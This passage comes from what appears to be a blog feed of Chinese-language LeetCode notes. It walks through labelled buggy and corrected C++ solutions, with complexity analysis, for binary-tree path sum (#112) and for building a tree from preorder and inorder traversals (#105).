class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">inorder</span> <span class="params">(TreeNode *current, <span class="type">int</span> counter, <span class="type">int</span> targetSum)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (current == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(counter != targetSum)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        counter += current-&gt;val;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; current-&gt;val &lt;&lt; endl;</span></span><br><span class="line">        <span class="comment">//cout &lt;&lt; &quot;count: &quot; &lt;&lt; counter &lt;&lt; endl;</span></span><br><span class="line">        <span class="type">bool</span> path1 = <span class="built_in">inorder</span>(current-&gt;left, counter , targetSum);</span><br><span class="line">        <span class="keyword">if</span>( path1 )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="type">bool</span> path2 = <span class="built_in">inorder</span>(current-&gt;right, counter , targetSum);</span><br><span class="line">        <span class="keyword">if</span>(path2)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* current, <span class="type">int</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(current == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">inorder</span>(current,count, targetSum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡就是初次 submit 的錯誤寫法，這在測資為 <code>root = [1,2]</code>, <code>targetSum=1</code> 的時候會出問題，其實塭堤發生在，我們每次在呼叫 <code>inorder</code> 的時候，即使走到leaf 回傳 false，如果走到 2，那 <code>counter</code> 值會是 3，此時 <code>counter!=targetSum</code> 因此回傳 <code>false</code>，但當我們一路回傳到原先的 caller 節點1的時候，此時 counter 值，並不會是我們在 callee 中所累加的值，而是又會被更新為原本還在 caller 時候的 counter 值，此時 counter 還是1，但這樣會讓我們接下來在 <code>path2</code> function call 的時候以為  <code>counter==targetSum</code>，這樣就會出問題。</p><div class="note info flat"><p>總而言之，counter 在遞迴過程中被錯誤修改。當我們在Tree中 traverse時，counter 應該代表當前路徑上所有節點值的總和。遞迴的每一條路徑都應該獨立計算，不應該試圖回退或修改之前的計算值。</p></div><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">inorder</span> <span class="params">(TreeNode *current, <span class="type">int</span> counter, <span class="type">int</span> targetSum)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (current == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        counter += current-&gt;val;</span><br><span class="line">        <span class="comment">// compare the counter and targetSum while visiting the leaf node. </span></span><br><span class="line">        <span class="keyword">if</span>(current-&gt;left == <span class="literal">nullptr</span> &amp;&amp; current-&gt;right == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(counter == targetSum)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> path1 = <span class="built_in">inorder</span>(current-&gt;left, counter , targetSum);</span><br><span class="line">        <span class="keyword">if</span>( path1 )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="type">bool</span> path2 = <span class="built_in">inorder</span>(current-&gt;right, counter , targetSum);</span><br><span class="line">        <span class="keyword">if</span>(path2)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* current, <span class="type">int</span> targetSum)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(current == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">inorder</span>(current,count, targetSum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡做的改動就是，<strong>將 counter 值以及targetSum 的比較，提前到 node visiting 階段就進行比較，而不是等到 function call 結束後才return 比較結果</strong> 這樣做的好處是，每條遞迴路徑可以獨立進行判斷，一旦發現符合條件的路徑就立即返回 true，避免了不必要的回溯和計算。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/112/result.jpeg"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>解答區發現了一個更精簡的作法，它的核心想法就是：</p><ul><li>若 root 為 null，回傳false</li><li>若 root 就是leaf，檢查 targetSum 是否跟 leaf 值一樣</li><li>若上面條件都不滿足，遞迴檢查左右子樹是否有valid的路徑，在function call 前會先將 <code>targetSum</code> 減去當前節點值，反正如果path sum 跟 <code>targetSum</code> 一樣，那檢查到 leaf 節點時， <code>targetSum</code> 也會與 leaf 節點值一樣。</li><li>如果都不滿足，就回傳false</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasPathSum</span><span class="params">(TreeNode* root, <span class="type">int</span> targetSum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left &amp;&amp; !root-&gt;right) &#123;</span><br><span class="line">            <span class="keyword">return</span> targetSum == root-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">bool</span> left_sum = <span class="built_in">hasPathSum</span>(root-&gt;left, targetSum - root-&gt;val);</span><br><span class="line">        <span class="type">bool</span> right_sum = <span class="built_in">hasPathSum</span>(root-&gt;right, targetSum - root-&gt;val);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> left_sum || right_sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>我們需要遍歷整個Binary Tree，以便檢查是否存在一條從根節點到葉節點的路徑，因此複雜度會是 $O(N)$，$N$ 為節點數量</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>worst case: $O(h)$，$h$ 為樹的高度</li><li>balanced tree: $O(LogN)$, $N$ 為節點數量</li></ul><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次少考慮了 function call 在傳遞過程中，參數的變化。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>透過 Preorder Traversal 和 Inorder Traversal 建構二元樹 | Medium | LeetCode#105. Construct Binary Tree from Preorder and Inorder Traversal</title>
      <link href="/posts/13d1e5ab.html"/>
      <url>/posts/13d1e5ab.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/105/question.jpeg"></p><p><img src="/img/LeetCode/105/question2.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給兩個整數陣列 <code>preorder</code> 以及 <code>inorder</code>， <code>preorder</code> 存放一棵二元樹進行 Pre-Order Traversal 的結果，<code>inorder</code> 存放相同二元樹進行 In-Order Traversal 的結果，題目要求透過這兩個陣列來建構出原本的Binary Tree，並回傳 root 節點。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這次的題目卡了很久，主要流程有嘗試寫下想法，但不知道該如何用遞迴去實作。</p><p><img src="/img/LeetCode/105/thought1.png"></p><p><img src="/img/LeetCode/105/thought2.png"></p><blockquote><p>字有點醜，請見諒XD</p></blockquote><p>首先第一個想法就是，<strong>Preorder Traversal 後的第一個元素必定會是Root</strong>，而再來就是 Inorder Traversal 後的第一個元素會是整棵樹的 leftmost node，也就是最左邊的節點，所以如果能夠迭題目給的 <code>preorder</code> list，從 Root 到 leftmost node 之間的元素都會是左子樹的 left child。<strong>在 Preorder Traversal 中，root 節點的下一個節點會是左子樹的Root</strong>，這時檢查　<code>inorder</code> list 中， 左子樹的root，到整棵樹的root之間所經過的節點，就會是左子樹的 right child 節點。 到這裡其實已經亂掉了，比較像是看圖說故事。</p><h2 id="核心想法"><a href="#核心想法" class="headerlink" title="核心想法"></a>核心想法</h2><p>後來砍掉重練後，花了不少時間打底，這題的核心思想只有幾個，也就是上面標註的:</p><ul><li>Preorder Traversal 後的第一個元素必定會是Root</li><li>Preorder List 中，Root 後面的節點，會先是左子樹節點，再來是右子樹，<strong>但需要知道如何分割左右子樹</strong></li><li>這時去對照 Root 在 Inorder Traversal 中的位置，<strong>陣列中 Root 的左側會是左子樹，右側會是右子樹</strong></li><li>既然知道左右子樹各有多少節點，<strong>就可以回到原先的 Preorder List 中對除了 Root 以外的節點去做 partitions</strong></li><li>在左柚子樹中，就可以遞迴的去跑演算法來建立節點 <strong>(但左右子樹要做的事情也一樣 1.找Root 2. 分割左右子樹)</strong></li></ul><p><img src="/img/LeetCode/105/algo1.png"></p><p><img src="/img/LeetCode/105/algo2.png"></p><p><img src="/img/LeetCode/105/algo3.png"></p><p><img src="/img/LeetCode/105/algo4.png"></p><p><img src="/img/LeetCode/105/algo5.png"></p><p><img src="/img/LeetCode/105/algo6.png"></p><h2 id="錯誤寫法"><a href="#錯誤寫法" class="headerlink" title="錯誤寫法"></a>錯誤寫法</h2><p>一開始寫出的是下面這一坨，這一坨出來的答案會是錯誤的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; preorder, vector&lt;<span class="type">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preorder.<span class="built_in">empty</span>() || inorder.<span class="built_in">empty</span>() || preorder.<span class="built_in">size</span>() != inorder.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> rootVal = preorder[<span class="number">0</span>];</span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// find the mid value of the inorder list</span></span><br><span class="line">        <span class="type">int</span> mid;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> mid=<span class="number">0</span>; mid&lt;inorder.<span class="built_in">size</span>();mid++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[mid]== rootVal)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//This parts are for storing the orginal list into sub arrays.</span></span><br><span class="line">        <span class="comment">// except for root node</span></span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; LeftPreorder = &#123;preorder.<span class="built_in">begin</span>()+<span class="number">1</span>,preorder.<span class="built_in">begin</span>()+<span class="number">1</span>+mid&#125;;</span><br><span class="line">        </span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; LeftInorder = &#123;inorder.<span class="built_in">begin</span>(),inorder.<span class="built_in">begin</span>()+mid&#125;;</span><br><span class="line">        </span><br><span class="line">        root -&gt; left = <span class="built_in">buildTree</span>(LeftPreorder, LeftInorder);</span><br><span class="line"></span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; RightPreorder = &#123;preorder.<span class="built_in">begin</span>()+<span class="number">1</span>+mid, preorder.<span class="built_in">end</span>()&#125;;</span><br><span class="line">        </span><br><span class="line">        vector &lt;<span class="type">int</span>&gt; RightInorder = &#123;inorder.<span class="built_in">begin</span>()+<span class="number">1</span>+mid, inorder.<span class="built_in">end</span>()&#125;;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        root -&gt; right = <span class="built_in">buildTree</span>(RightPreorder, RightInorder);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要會事先宣告一個 mid，作為後續切分子樹的中間值，上面主要是要找 preorder 的 root，對應到 inorder 陣列中的位置。但其實我寫的這段會出問題，後續會進行說明。</p><p>下方遞迴呼叫其實就是去拆分子樹，並且遞迴建立節點。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root-&gt;left = buildTree(左子樹Preorder陣列，左子樹Inorder陣列)</span><br><span class="line">root-&gt;right = buildTree(右子樹Preorder陣列，右子樹Inorder陣列)</span><br></pre></td></tr></table></figure><p>但上面的程式會有幾個問題，首先是計算 mid 還有建立節點的時候，由於函數遞迴執行，因此每次都會重新建立值為 <code>preorder[0]</code> 的節點，另外找 mid 的時候，如果進到左右子樹 sub Array 去找子樹的 Root，這裡迴圈中給的範圍也會有問題。</p><p><strong>另外，再進行遞迴呼叫前，宣告了多個新的向量，需要確保沒有分割錯誤和越界，並且這種作法又會占用更多記憶體</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTreeHelper</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; preorder, <span class="type">int</span> preStart, <span class="type">int</span> preEnd,</span></span></span><br><span class="line"><span class="params"><span class="function">                              <span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; inorder, <span class="type">int</span> inStart, <span class="type">int</span> inEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preStart &gt; preEnd || inStart &gt; inEnd) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> rootVal = preorder[preStart];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootVal);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid;</span><br><span class="line">        <span class="keyword">for</span> (mid = inStart; mid &lt;= inEnd; mid++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[mid] == rootVal) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> leftTreeSize = mid - inStart;</span><br><span class="line"></span><br><span class="line">        root-&gt;left = <span class="built_in">buildTreeHelper</span>(preorder, preStart + <span class="number">1</span>, preStart + leftTreeSize, inorder, inStart, mid - <span class="number">1</span>);</span><br><span class="line">        root-&gt;right = <span class="built_in">buildTreeHelper</span>(preorder, preStart + leftTreeSize + <span class="number">1</span>, preEnd, inorder, mid + <span class="number">1</span>, inEnd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; preorder, vector&lt;<span class="type">int</span>&gt;&amp; inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preorder.<span class="built_in">empty</span>() || inorder.<span class="built_in">empty</span>() || preorder.<span class="built_in">size</span>() != inorder.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buildTreeHelper</span>(preorder, <span class="number">0</span>, preorder.<span class="built_in">size</span>() - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡我們宣告一個新的 <code>buildTreeHelper</code> 函數，在一開始的參數就給定原本 list 中的 index 範圍，然後遞迴呼叫它，在反覆呼叫的過程將左右子樹的起點終點作為參數輸入，而不是去建立新的向量。</p><p>在 <code>buildTreeHelper</code> 函式中，首先輸入參數為:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; preorder, </span><br><span class="line"><span class="type">int</span> preStart, </span><br><span class="line"><span class="type">int</span> preEnd,</span><br><span class="line"><span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; inorder, </span><br><span class="line"><span class="type">int</span> inStart, </span><br><span class="line"><span class="type">int</span> inEnd</span><br></pre></td></tr></table></figure><p>分別代表，preorder 的開始index,結束index，以及 inorder 的開始index, 結束index<br>另外也有傳入 <code>preorder</code> list 跟 <code>inorder</code> list，使用 <code>const</code> 可以避免在函數內意外修改list</p><p>首先</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preStart &gt; preEnd || inStart &gt; inEnd) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br></pre></td></tr></table></figure><p>如果 <code>preStart &gt; preEnd </code> 或者 <code>inStart &gt; inEnd</code> 則回傳 nullptr</p><p>Root 的節點值會是 <code>preorder[preStart]</code>，這就與一開始的寫法不同，這就保證了每次都能夠找到正確的 Root 值，不論是整棵樹或者是子樹。接著就是去建立節點。以及要去找到 Root 值在 Inorder List 當中的位置在哪，也就是 <code>mid</code> ，知道 <code>mid</code> 後就能夠去知道下一次建立節點，該如何切分左右子樹的範圍。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> leftTreeSize = mid - inStart;</span><br></pre></td></tr></table></figure><p>這個步驟可以知道對於 Inorder List，左子樹有多少個節點</p><p>因此一樣再度呼叫 <code>buildTreeHelper</code> 函式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root-&gt;left = <span class="built_in">buildTreeHelper</span>(preorder, preStart + <span class="number">1</span>, preStart + leftTreeSize, inorder, inStart, mid - <span class="number">1</span>);</span><br><span class="line">root-&gt;right = <span class="built_in">buildTreeHelper</span>(preorder, preStart + leftTreeSize + <span class="number">1</span>, preEnd, inorder, mid + <span class="number">1</span>, inEnd);</span><br></pre></td></tr></table></figure><p>建構左子樹時，給定的 Preorder 範圍，會從原先的 <code>preStart+1</code> (首先要從原先的 Root 的下一個值開始建構)，到剛剛的 mid 對應preorder的位置，<code>preStart + leftTreeSize</code> 這邊會是對於當前 Root 來說，左子樹在 Preorder ˋ這個 List 的範圍。接下來 inorder 的範圍就是從 <code>inStart</code> 到 <code>mid-1</code> (排除 mid 本身，因為它會是當前的root)。</p><p>建構右子樹時，道理一樣，要去給定 Preorder 和 Inorder sub Array 的範圍，以 Preorder 來說右子樹起點會是 <code>preStart + leftTreeSize+1</code>，終點會是 <code>preEnd</code>，Inorder 的右子樹起點會是 <code>mid+1</code> (排除mid本身，因為它會是當前的root)，終點會是 <code>inEnd</code>。 </p><p>最後回來看，原本的 <code>buildTree</code> 需要判斷輸入的兩個list 是否為空，並且長度一樣，接著就呼叫 <code>buildTreeHelper</code> 函數，並將root回傳給 callee (or main())，Preorder 以及 Inorder 的範圍就先給整個list的長度。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">buildTreeHelper</span>(preorder, <span class="number">0</span>, preorder.<span class="built_in">size</span>() - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img 